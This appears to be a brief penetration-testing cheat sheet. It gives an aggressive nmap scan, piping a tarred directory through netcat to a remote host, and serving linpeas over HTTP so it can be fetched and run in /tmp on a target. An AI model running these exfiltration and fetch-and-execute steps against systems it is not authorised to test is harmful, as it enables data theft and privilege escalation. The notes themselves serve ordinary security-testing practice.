## Nmap scan:
```bash
nmap -v -sV -O -A --top-ports 5000 -oN output.txt <host>
```

## Send directory with `netcat`
### Sender:
```bash
tar -czf directory.tar.gz ./directory
cat directory.tar.gz | nc <host> 1234
```
### Receiver:
```bash
nc -l -p 1234 > directory.tar.gz
```

## Download and serve linpeas
### Sender:
```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
sudo python3 -m http.server 8080
```
### Receiver
```bash
cd /tmp
wget <host>:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a > ./output.txt
less -r ./output.txt
```
